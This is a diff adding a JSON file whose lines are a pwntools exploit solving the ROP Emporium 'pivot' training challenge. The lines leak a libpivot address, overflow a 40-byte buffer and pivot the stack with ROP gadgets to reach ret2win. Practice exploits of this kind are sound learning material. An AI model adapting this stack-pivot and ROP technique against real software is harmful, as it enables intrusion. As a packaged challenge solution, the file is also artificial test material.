@@ -1,0 +1,32 @@
+```json
+{
+  "body_lines": [
+    "p = process([str(binary_path)], env={'LD_LIBRARY_PATH': str(runtime_dir)})",
+    "libpivot = ELF(str(runtime_dir / 'libpivot.so'), checksec=False)",
+    "rop = ROP(elf)",
+    "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
+    "ret = rop.find_gadget(['ret'])[0]",
+    "pop_rax = 0x4009bb",
+    "xchg_rsp_rax = 0x4009bd",
+    "p.recvuntil(b'pivot: ')",
+    "pivot_addr = int(p.recvline().strip(), 16)",
+    "chain1 = flat([elf.plt['foothold_function'], pop_rdi, elf.got['foothold_function'], ret, elf.plt['puts'], elf.symbols['main']])",
+    "p.sendlineafter(b'> ', chain1)",
+    "smash1 = b'A' * 40 + p64(pop_rax) + p64(pivot_addr) + p64(xchg_rsp_rax)",
+    "p.sendlineafter(b'> ', smash1)",
+    "out = p.recvuntil(b'pivot: ')",
+    "lines = out.split(b'\\n')",
+    "for i, line in enumerate(lines):",
+    "    if b'pivot by ROP Emporium' in line:",
+    "        leak = u64(lines[i-1].replace(b'\\r', b'').ljust(8, b'\\x00')[:8])",
+    "        break",
+    "libpivot.address = leak - libpivot.symbols['foothold_function']",
+    "pivot_addr2 = int(p.recvline().strip(), 16)",
+    "chain2 = flat([ret, libpivot.symbols['ret2win']])",
+    "p.sendlineafter(b'> ', chain2)",
+    "smash2 = b'A' * 40 + p64(pop_rax) + p64(pivot_addr2) + p64(xchg_rsp_rax)",
+    "p.sendlineafter(b'> ', smash2)",
+    "print(p.recvall().decode('latin-1', 'ignore'))"
+  ]
+}
+```
